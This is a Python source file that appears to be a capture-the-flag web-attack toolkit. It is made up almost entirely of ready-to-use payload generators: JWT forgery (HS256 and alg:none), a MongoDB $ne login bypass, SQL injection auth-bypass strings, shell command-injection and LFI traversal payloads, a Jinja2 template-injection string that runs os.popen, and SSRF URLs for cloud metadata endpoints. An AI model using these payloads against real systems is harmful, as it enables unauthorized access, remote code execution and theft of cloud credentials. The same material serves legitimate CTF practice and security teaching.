from __future__ import annotations

import base64
import hashlib
import hmac
import json
from urllib.parse import parse_qs, quote, quote_plus, unquote, unquote_plus, urlencode

REQUEST_TEMPLATES: dict[str, str] = {
    "get": "GET {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: ctf-toolkit/1.0\r\nAccept: */*\r\n\r\n",
    "post_form": "POST {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: ctf-toolkit/1.0\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {length}\r\n\r\n{body}",
    "post_json": "POST {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: ctf-toolkit/1.0\r\nContent-Type: application/json\r\nContent-Length: {length}\r\n\r\n{body}",
}


def url_encode(text: str) -> str:
    """Encode string for URL query parameter safely."""
    return quote(text, safe="")


def url_decode(text: str) -> str:
    """Decode percent-encoded URL string."""
    return unquote(text)


def b64url_encode(data: bytes) -> str:
    """Encode bytes to URL-safe base64 without padding."""
    return base64.urlsafe_b64encode(data).decode().rstrip("=")


def b64url_decode(text: str) -> bytes:
    """Decode URL-safe base64 string, adding missing padding."""
    padded = text + "=" * (-len(text) % 4)
    return base64.urlsafe_b64decode(padded.encode())


def jwt_decode_no_verify(token: str) -> dict[str, object]:
    """Decode JWT header and payload without verifying signature."""
    parts = token.strip().split(".")
    if len(parts) < 2:
        raise ValueError("Invalid JWT format (expected at least header.payload)")
    header = json.loads(b64url_decode(parts[0]))
    payload = json.loads(b64url_decode(parts[1]))
    return {"header": header, "payload": payload}


def jwt_forge_hs256(payload: dict[str, object], secret: str, header: dict[str, object] | None = None) -> str:
    """Forge HS256-signed JWT with custom payload and secret."""
    hdr = header or {"alg": "HS256", "typ": "JWT"}
    hdr_b64 = b64url_encode(json.dumps(hdr, separators=(",", ":")).encode())
    payload_b64 = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{hdr_b64}.{payload_b64}".encode()
    signature = hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
    return f"{hdr_b64}.{payload_b64}.{b64url_encode(signature)}"


def build_basic_auth(username: str, password: str) -> str:
    """Build Authorization header value for Basic HTTP Authentication."""
    creds = f"{username}:{password}".encode()
    return f"Basic {base64.b64encode(creds).decode()}"


def parse_cookies(cookie_header: str) -> dict[str, str]:
    """Parse raw Cookie header string into dictionary."""
    cookies: dict[str, str] = {}
    for part in cookie_header.split(";"):
        part = part.strip()
        if "=" in part:
            k, v = part.split("=", 1)
            cookies[k.strip()] = v.strip()
    return cookies


def format_cookies(cookies: dict[str, str]) -> str:
    """Format dictionary into standard HTTP Cookie header string."""
    return "; ".join(f"{k}={v}" for k, v in cookies.items())


def build_nosql_query_payload(field: str, operator: str = "$ne", value: object = "") -> dict[str, object]:
    """Construct MongoDB query dictionary with operator bypass."""
    return {field: {operator: value}}


def jwt_forge_alg_none(payload: dict[str, object], header: dict[str, object] | None = None) -> str:
    """Forge unsigned JWT with alg: none and empty signature."""
    hdr = header or {"alg": "none", "typ": "JWT"}
    hdr_b64 = b64url_encode(json.dumps(hdr, separators=(",", ":")).encode())
    payload_b64 = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    return f"{hdr_b64}.{payload_b64}."


def build_graphql_query(field_name: str, subfields: list[str] | None = None) -> dict[str, str]:
    """Build basic GraphQL query payload dictionary."""
    if subfields:
        sub = " { " + " ".join(subfields) + " } "
    else:
        sub = ""
    return {"query": f"{{ {field_name}{sub} }}"}


def build_ssti_probes() -> dict[str, str]:
    """Return dictionary of common SSTI polyglot probes."""
    return {
        "jinja2_math": "{{ 7 * 7 }}",
        "jinja2_config": "{{ config.items() }}",
        "jinja2_rce": "{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat flag*').read() }}",
        "twig_math": "{{ 7 * '7' }}",
        "mako_math": "${ 7 * 7 }",
    }


def merge_mass_assignment(
    base: dict[str, object],
    overrides: dict[str, object],
    allowed_keys: set[str] | None = None,
) -> dict[str, object]:
    """Simulate mass assignment with optional whitelist protection."""
    result = dict(base)
    for k, v in overrides.items():
        if allowed_keys is None or k in allowed_keys:
            result[k] = v
    return result


def build_http_parameter_pollution_query(params: list[tuple[str, str]]) -> str:
    """Build an HTTP Parameter Pollution query string preserving duplicate keys."""
    return "&".join(f"{quote_plus(k)}={quote_plus(v)}" for k, v in params)


def parse_swagger_spec(spec: dict[str, object]) -> list[str]:
    """Extract route paths defined in an OpenAPI / Swagger document."""
    paths = spec.get("paths", {})
    if isinstance(paths, dict):
        return list(paths.keys())
    return []


def build_jsonp_callback_url(base_url: str, callback: str = "handleResponse") -> str:
    """Construct a JSONP endpoint URL appending callback parameter."""
    sep = "&" if "?" in base_url else "?"
    return f"{base_url}{sep}callback={quote_plus(callback)}"


def build_cors_null_origin_headers() -> dict[str, str]:
    """Return request headers testing null-origin CORS trust misconfiguration."""
    return {"Origin": "null"}


def build_sqli_auth_bypass(username: str = "admin", technique: str = "or_true") -> str:
    """Generate SQL injection authentication bypass strings for form inputs."""
    techniques = {
        "or_true": f"{username}' --",
        "or_1_equals_1": f"' OR 1=1 --",
        "or_true_hash": f"{username}' #",
        "admin_closed": f"{username}') --",
        "union_admin": f"' UNION SELECT 1,'{username}','hash' --",
    }
    return techniques.get(technique, f"{username}' --")


def build_command_injection_payload(base_arg: str = "127.0.0.1", separator: str = ";", command: str = "cat /flag.txt") -> str:
    """Generate shell command injection payloads using separators (; | && || $())."""
    if separator == "subshell":
        return f"{base_arg} $({command})"
    elif separator == "newline":
        return f"{base_arg}\n{command}"
    return f"{base_arg}{separator} {command}"


def build_lfi_traversal_path(filename: str = "flag.txt", depth: int = 4, double_encode: bool = False) -> str:
    """Generate directory traversal path sequences for LFI."""
    seq = "../" * depth + filename
    if double_encode:
        return seq.replace("..", "%252e%252e").replace("/", "%252f")
    return seq


def build_ssrf_metadata_url(service: str = "aws") -> str:
    """Return cloud metadata endpoints for SSRF probing."""
    services = {
        "aws": "http://169.254.169.254/latest/meta-data/",
        "gcp": "http://metadata.google.internal/computeMetadata/v1/",
        "digitalocean": "http://169.254.169.254/metadata/v1.json",
        "docker_internal": "http://172.17.0.1:8080/",
        "localhost": "http://127.0.0.1:8080/",
    }
    return services.get(service.lower(), "http://169.254.169.254/latest/meta-data/")
